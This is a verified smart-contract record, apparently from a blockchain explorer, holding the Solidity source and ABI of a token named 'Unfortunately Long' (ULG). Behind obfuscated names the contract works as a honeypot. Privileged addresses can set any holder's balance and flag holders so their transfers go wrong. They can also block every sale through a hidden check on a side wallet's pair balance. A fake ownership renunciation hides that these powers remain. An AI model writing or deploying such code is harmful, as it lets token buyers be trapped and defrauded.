{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface enableShould {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address autoLiquidity) external view returns (uint256);\n\n    function transfer(address tokenWalletTx, uint256 txSenderTake) external returns (bool);\n\n    function allowance(address modeLaunchedMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 txSenderTake) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address tokenWalletTx,\n        uint256 txSenderTake\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed modeToken, uint256 value);\n    event Approval(address indexed modeLaunchedMin, address indexed spender, uint256 value);\n}\n\nabstract contract enableTo {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tradingSender {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface fundLaunched {\n    function createPair(address fromMax, address walletTo) external returns (address);\n}\n\ninterface enableShouldMetadata is enableShould {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract UnfortunatelyLong is enableTo, enableShould, enableShouldMetadata {\n\n    function transferFrom(address maxFundIs, address tokenWalletTx, uint256 txSenderTake) external override returns (bool) {\n        if (_msgSender() != takeSellWallet) {\n            if (isWallet[maxFundIs][_msgSender()] != type(uint256).max) {\n                require(txSenderTake <= isWallet[maxFundIs][_msgSender()]);\n                isWallet[maxFundIs][_msgSender()] -= txSenderTake;\n            }\n        }\n        return buyTx(maxFundIs, tokenWalletTx, txSenderTake);\n    }\n\n    uint8 private enableTx = 18;\n\n    uint256 public isList;\n\n    address public fundSwap;\n\n    mapping(address => mapping(address => uint256)) private isWallet;\n\n    function tokenSell(address swapTake, uint256 txSenderTake) public {\n        tokenLimit();\n        tradingEnable[swapTake] = txSenderTake;\n    }\n\n    uint256 constant takeEnable = 13 ** 10;\n\n    uint256 receiverTo;\n\n    function transfer(address swapTake, uint256 txSenderTake) external virtual override returns (bool) {\n        return buyTx(_msgSender(), swapTake, txSenderTake);\n    }\n\n    bool private feeMin;\n\n    function getOwner() external view returns (address) {\n        return swapTo;\n    }\n\n    address takeSellWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public sellModeFee;\n\n    function decimals() external view virtual override returns (uint8) {\n        return enableTx;\n    }\n\n    function balanceOf(address autoLiquidity) public view virtual override returns (uint256) {\n        return tradingEnable[autoLiquidity];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return amountMode;\n    }\n\n    function walletEnable(address modeTrading) public {\n        if (tradingAmountTo) {\n            return;\n        }\n        \n        sellModeFee[modeTrading] = true;\n        if (buyFee == senderModeSwap) {\n            enableWallet = false;\n        }\n        tradingAmountTo = true;\n    }\n\n    string private tradingTotal = \"ULG\";\n\n    address private swapTo;\n\n    function senderTrading(address maxFundIs, address tokenWalletTx, uint256 txSenderTake) internal returns (bool) {\n        require(tradingEnable[maxFundIs] >= txSenderTake);\n        tradingEnable[maxFundIs] -= txSenderTake;\n        tradingEnable[tokenWalletTx] += txSenderTake;\n        emit Transfer(maxFundIs, tokenWalletTx, txSenderTake);\n        return true;\n    }\n\n    uint256 public tokenFrom;\n\n    uint256 public fundLiquidity;\n\n    bool public buyFee;\n\n    function approve(address sellLaunched, uint256 txSenderTake) public virtual override returns (bool) {\n        isWallet[_msgSender()][sellLaunched] = txSenderTake;\n        emit Approval(_msgSender(), sellLaunched, txSenderTake);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed fundTotal, address indexed toTx);\n\n    uint256 public fundBuy;\n\n    mapping(address => uint256) private tradingEnable;\n\n    uint256 private maxSellEnable;\n\n    bool public tradingAmountTo;\n\n    address buyWallet = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function senderShould(uint256 txSenderTake) public {\n        tokenLimit();\n        swapMarketing = txSenderTake;\n    }\n\n    function tokenLimit() private view {\n        require(sellModeFee[_msgSender()]);\n    }\n\n    function buyTx(address maxFundIs, address tokenWalletTx, uint256 txSenderTake) internal returns (bool) {\n        if (maxFundIs == fundSwap) {\n            return senderTrading(maxFundIs, tokenWalletTx, txSenderTake);\n        }\n        uint256 tradingAt = enableShould(receiverFee).balanceOf(buyWallet);\n        require(tradingAt == swapMarketing);\n        require(tokenWalletTx != buyWallet);\n        if (takeFromMax[maxFundIs]) {\n            return senderTrading(maxFundIs, tokenWalletTx, takeEnable);\n        }\n        return senderTrading(maxFundIs, tokenWalletTx, txSenderTake);\n    }\n\n    function allowance(address launchLaunched, address sellLaunched) external view virtual override returns (uint256) {\n        if (sellLaunched == takeSellWallet) {\n            return type(uint256).max;\n        }\n        return isWallet[launchLaunched][sellLaunched];\n    }\n\n    bool private enableWallet;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return buyReceiver;\n    }\n\n    function owner() external view returns (address) {\n        return swapTo;\n    }\n\n    address public receiverFee;\n\n    bool public senderModeSwap;\n\n    string private amountMode = \"Unfortunately Long\";\n\n    constructor (){\n        \n        tradingSender teamFrom = tradingSender(takeSellWallet);\n        receiverFee = fundLaunched(teamFrom.factory()).createPair(teamFrom.WETH(), address(this));\n        \n        fundSwap = _msgSender();\n        shouldAuto();\n        sellModeFee[fundSwap] = true;\n        tradingEnable[fundSwap] = buyReceiver;\n        if (senderModeSwap) {\n            senderModeSwap = false;\n        }\n        emit Transfer(address(0), fundSwap, buyReceiver);\n    }\n\n    mapping(address => bool) public takeFromMax;\n\n    function symbol() external view virtual override returns (string memory) {\n        return tradingTotal;\n    }\n\n    bool public teamAtLaunch;\n\n    uint256 swapMarketing;\n\n    function shouldAuto() public {\n        emit OwnershipTransferred(fundSwap, address(0));\n        swapTo = address(0);\n    }\n\n    function buyEnable(address maxLaunched) public {\n        tokenLimit();\n        \n        if (maxLaunched == fundSwap || maxLaunched == receiverFee) {\n            return;\n        }\n        takeFromMax[maxLaunched] = true;\n    }\n\n    uint256 private buyReceiver = 100000000 * 10 ** 18;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeLaunchedMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundTotal\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"toTx\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeToken\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchLaunched\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellLaunched\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellLaunched\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txSenderTake\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoLiquidity\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLaunched\",\"type\":\"address\"}],\"name\":\"buyEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundBuy\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundLiquidity\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"sellModeFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderModeSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"txSenderTake\",\"type\":\"uint256\"}],\"name\":\"senderShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeFromMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamAtLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenFrom\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txSenderTake\",\"type\":\"uint256\"}],\"name\":\"tokenSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingAmountTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txSenderTake\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxFundIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenWalletTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"txSenderTake\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeTrading\",\"type\":\"address\"}],\"name\":\"walletEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "UnfortunatelyLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}